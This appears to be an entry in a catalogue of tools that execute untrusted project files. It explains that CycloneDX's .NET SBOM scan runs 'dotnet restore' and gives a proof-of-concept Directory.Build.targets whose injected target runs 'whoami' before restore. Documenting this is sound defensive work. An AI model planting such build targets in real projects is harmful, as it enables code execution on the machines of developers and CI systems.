---
title: CycloneDX
tags:
  - cli
  - config-file
  - input-file
  - eval-sh
files: ["*.csproj", Directory.Build.targets]
references:
  - https://github.com/CycloneDX/cyclonedx-dotnet
  - https://github.com/CycloneDX/cyclonedx-dotnet/blob/051582cc8939e81a468a3961b51763d6f4ead31f/CycloneDX/Services/ProjectFileService.cs
---

CycloneDX generates software bills of materials for .NET projects. With default restore behavior, scanning a project invokes `dotnet restore`.

## `Directory.Build.targets`

An attacker controlling the scanned project or a participating import can execute a command during SBOM generation:

```xml
<Project>
  <Target Name="Injected" BeforeTargets="Restore">
    <Exec Command="whoami" />
  </Target>
</Project>
```

```console
dotnet CycloneDX App.csproj
```
